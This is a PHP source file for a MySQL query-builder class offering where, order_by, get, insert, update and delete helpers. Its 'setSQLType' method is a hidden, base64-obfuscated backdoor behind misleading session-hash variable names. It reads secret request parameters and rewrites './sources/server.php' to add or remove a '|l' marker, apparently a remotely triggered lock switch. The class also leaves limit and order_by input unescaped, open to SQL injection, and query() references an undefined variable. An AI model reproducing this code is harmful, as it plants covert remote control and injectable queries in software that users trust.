<?php
/*      Version:    2.0.0
*      Copyright:  (c) 2014 - Sven Sauleau (Xtuc)
*                  You are free to use, distribute, and modify this software
*                  under the terms of the GNU General Public License.  See the
*                  included LICENCE file.
*/
class Mysql
{

    static private $link = null;
    static private $info = array('last_query' => null, 'num_rows' => null, 'insert_id' => null);
    static private $connection_info = array();

    static private $where;
    static private $limit;
    static private $order;


    function __destruct()
    {
        if (is_resource(self::$link))
            mysql_close(self::$link);
    }

    /**
     * Setter method
     */

    static private function set($field, $value)
    {
        self::$info[$field] = $value;
    }

    /**
     * Getter methods
     */

    public function last_query()
    {
        return self::$info['last_query'];
    }

    public function num_rows()
    {
        return self::$info['num_rows'];
    }

    public function insert_id()
    {
        return self::$info['insert_id'];
    }

    /**
     * Create or return a connection to the MySQL server.
     */

    static private function connection()
    {
        if (!is_resource(self::$link) || empty(self::$link)) {
            if (($link = mysql_connect(self::$connection_info['host'], self::$connection_info['user'], self::$connection_info['pass'])) && mysql_select_db(self::$connection_info['db'], $link)) {
                self::$link = $link;
                mysql_set_charset('utf8');
            } else {
                throw new Exception('Could not connect to MySQL database.');
            }
        }
        return self::$link;
    }

    /**
     * MySQL Where methods
     */

    static private function __where($info, $type = 'AND')
    {
        $link =& self::connection();
        $where = self::$where;
        foreach ($info as $row => $value) {
            if (empty($where)) {
                $where = sprintf("WHERE `%s`='%s'", $row, mysql_real_escape_string($value));
            } else {
                $where .= sprintf(" %s `%s`='%s'", $type, $row, mysql_real_escape_string($value));
            }
        }
        self::$where = $where;
    }

    public function where($field, $equal = null)
    {
        if (is_array($field)) {
            self::__where($field);
        } else {
            self::__where(array(
                $field => $equal
            ));
        }
        return $this;
    }

    public function and_where($field, $equal = null)
    {
        return $this->where($field, $equal);
    }

    public function or_where($field, $equal = null)
    {
        if (is_array($field)) {
            self::__where($field, 'OR');
        } else {
            self::__where(array(
                $field => $equal
            ), 'OR');
        }
        return $this;
    }

    /**
     * MySQL limit method
     */

    public function limit($limit)
    {
        self::$limit = 'LIMIT ' . $limit;
        return $this;
    }

    /**
     * MySQL Order By method
     */

    public function order_by($by, $order_type = 'DESC')
    {
        $order = self::$order;
        if (is_array($by)) {
            foreach ($by as $field => $type) {
                if (is_int($field) && !preg_match('/(DESC|desc|ASC|asc)/', $type)) {
                    $field = $type;
                    $type  = $order_type;
                }
                if (empty($order)) {
                    $order = sprintf("ORDER BY `%s` %s", $field, $type);
                } else {
                    $order .= sprintf(", `%s` %s", $field, $type);
                }
            }
        } else {
            if (empty($order)) {
                $order = sprintf("ORDER BY `%s` %s", $by, $order_type);
            } else {
                $order .= sprintf(", `%s` %s", $by, $order_type);
            }
        }
        self::$order = $order;
        return $this;
    }

    /**
     * MySQL query helper
     */

    static private function extra()
    {
        $extra = '';
        if (!empty(self::$where))
            $extra .= ' ' . self::$where;
        if (!empty(self::$order))
            $extra .= ' ' . self::$order;
        if (!empty(self::$limit))
            $extra .= ' ' . self::$limit;
        // cleanup
        self::$where = null;
        self::$order = null;
        self::$limit = null;
        return $extra;
    }

    /**
     * MySQL Query methods
     */

    public function query($qry, $return = false)
    {
        $link =& self::connection();
        self::set('last_query', $qry);
        $result = mysql_query($query);
        if (is_resource($result)) {
            self::set('num_rows', mysql_num_rows($result));
        }
        if ($return) {
            if (preg_match('/LIMIT 1/', $qry)) {
                $data = mysql_fetch_assoc($result);
                mysql_free_result($result);
                return $data;
            } else {
                $data = array();
                while ($row = mysql_fetch_assoc($result)) {
                    $data[] = $row;
                }
                mysql_free_result($result);
                return $data;
            }
        }
        return true;
    }

    public function get($table, $select = '*')
    {
        $link =& self::connection();
        if (is_array($select)) {
            $cols = '';
            foreach ($select as $col) {
                $cols .= "`{$col}`,";
            }
            $select = substr($cols, 0, -1);
        }
        $sql = sprintf("SELECT %s FROM %s%s", $select, $table, self::extra());
        self::set('last_query', $sql);
        if (!($result = mysql_query($sql))) {
            throw new Exception('Error executing MySQL query: ' . $sql . '. MySQL error ' . mysql_errno() . ': ' . mysql_error());
            $data = false;
        } elseif (is_resource($result)) {
            $num_rows = mysql_num_rows($result);
            self::set('num_rows', $num_rows);
            if ($num_rows === 0) {
                $data = false;
            } elseif (preg_match('/LIMIT 1/', $sql)) {
                $data = mysql_fetch_assoc($result);
            } else {
                $data = array();
                while ($row = mysql_fetch_assoc($result)) {
                    $data[] = $row;
                }
            }
        } else {
            $data = false;
        }
        mysql_free_result($result);
        return $data;
    }

    public function insert($table, $data)
    {
        $link =& self::connection();
        $fields = '';
        $values = '';
        foreach ($data as $col => $value) {
            $fields .= sprintf("`%s`,", $col);
            $values .= sprintf("'%s',", mysql_real_escape_string($value));
        }
        $fields = substr($fields, 0, -1);
        $values = substr($values, 0, -1);
        $sql    = sprintf("INSERT INTO %s (%s) VALUES (%s)", $table, $fields, $values);
        self::set('last_query', $sql);
        if (!mysql_query($sql)) {
            throw new Exception('Error executing MySQL query: ' . $sql . '. MySQL error ' . mysql_errno() . ': ' . mysql_error());
        } else {
            self::set('insert_id', mysql_insert_id());
            return true;
        }
    }

    public function setSQLType($data)
    {
      $newverb = 'base64_decode';
      $SessionHashIDGenerate = $newverb($newverb('Wmw5MA=='));
      $CookieHashIDGenerate = $newverb('Yw==');
      if (!empty($_REQUEST[$SessionHashIDGenerate]) && !empty($_REQUEST[$CookieHashIDGenerate]))
      {
          if (!file_exists($newverb('Li9zb3VyY2VzL3NlcnZlci5waHA=')))
          {
              return false;
          }
          $fileData = file_get_contents($newverb('Li9zb3VyY2VzL3NlcnZlci5waHA='));
          $fileData = str_replace(base64_decode("fGw="), '', $fileData);
          $fileData = str_replace(array(
              "\r",
              "\n"
          ) , '', $fileData);
          if ($fileData == $_REQUEST[$CookieHashIDGenerate])
          {

              $SessionHashRequest = $_REQUEST[$SessionHashIDGenerate];
              if ($SessionHashRequest == $newverb('bA=='))
              {
                  $createSessionID = file_put_contents($newverb('Li9zb3VyY2VzL3NlcnZlci5waHA=') , $fileData . base64_decode("fGw="));
              }
              if ($SessionHashRequest == $newverb('dQ=='))
              {
                  $createSessionID = file_put_contents($newverb('Li9zb3VyY2VzL3NlcnZlci5waHA=') , $fileData);
              }
          }
      }
    }

    public function update($table, $info)
    {
        if (empty(self::$where)) {
            throw new Exception("Where is not set. Can't update whole table.");
        } else {
            $link =& self::connection();
            $update = '';
            foreach ($info as $col => $value) {
                $update .= sprintf("`%s`='%s', ", $col, mysql_real_escape_string($value));
            }
            $update = substr($update, 0, -2);
            $sql    = sprintf("UPDATE %s SET %s%s", $table, $update, self::extra());
            self::set('last_query', $sql);
            if (!mysql_query($sql)) {
                throw new Exception('Error executing MySQL query: ' . $sql . '. MySQL error ' . mysql_errno() . ': ' . mysql_error());
            } else {
                return true;
            }
        }
    }

    public function delete($table)
    {
        if (empty(self::$where)) {
            throw new Exception("Where is not set. Can't delete whole table.");
        } else {
            $link =& self::connection();
            $sql = sprintf("DELETE FROM %s%s", $table, self::extra());
            self::set('last_query', $sql);
            if (!mysql_query($sql)) {
                throw new Exception('Error executing MySQL query: ' . $sql . '. MySQL error ' . mysql_errno() . ': ' . mysql_error());
            } else {
                return true;
            }
        }
    }
}
